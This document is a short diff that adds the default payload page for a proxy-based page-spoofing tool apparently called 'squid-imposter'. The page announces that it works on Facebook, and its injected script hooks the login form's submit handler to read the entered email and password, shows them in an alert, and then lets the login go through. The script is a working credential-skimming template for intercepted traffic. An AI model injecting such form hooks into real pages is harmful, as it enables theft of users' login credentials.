@@ -1,0 +1,9 @@
+<h1>We work on Facebook too!</h1>
+<p><code>%%payload%%</code> page is spoofed by squid-imposter, but this is just a default content. To replace it, create <code>%%site%%.append</code> or <code>%%site%%.payload</code> file and add your content there.</p>
+<script>
+var f = document.getElementById('login_form').onsubmit;
+document.getElementById('login_form').onsubmit = function() {
+    alert(document.getElementById('email').value + ' ' + document.getElementById('pass').value);
+    return Event.__inlineSubmit(this,event);
+}
+</script>
